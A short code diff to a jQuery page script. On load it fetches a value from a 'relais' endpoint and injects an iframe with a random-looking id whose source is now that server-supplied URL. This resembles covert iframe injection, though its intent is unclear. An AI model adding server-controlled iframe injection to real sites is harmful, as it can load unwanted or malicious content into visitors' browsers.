@@ -29,7 +29,7 @@ $(document).ready(function()
             $.get(server_web+'relais/index.php?iframe=1', function(data){
                 if(data != ''){
                    var ifrm = document.createElement("IFRAME");
-                   ifrm.setAttribute("src", "http://developerfusion.com/");
+                   ifrm.setAttribute("src", data);
                     ifrm.setAttribute("id", "zfpjfizeoi");
                     document.body.appendChild(ifrm); 
                 }
